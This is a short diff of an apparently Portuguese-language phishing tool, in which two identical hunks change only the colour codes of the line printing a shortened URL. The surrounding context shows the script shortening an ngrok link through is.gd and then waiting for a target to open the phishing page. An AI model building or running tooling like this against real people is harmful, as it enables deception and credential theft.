@@ -223,7 +223,7 @@ exit();''' %url_action)
            print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
            server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
            if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
-             print ("\n" + G + "[" + W + "+" + G + "]" + C + " URL Encurtada: " + W + "%s" %server.text)
+             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
              time.sleep(1.2)
              print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
              while (True):
@@ -363,7 +363,7 @@ exit();''' %url_action)
            print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
            server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
            if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
-             print ("\n" + G + "[" + W + "+" + G + "]" + C + " URL Encurtada: " + W + "%s" %server.text)
+             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
              time.sleep(1.2)
              print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
              while (True):
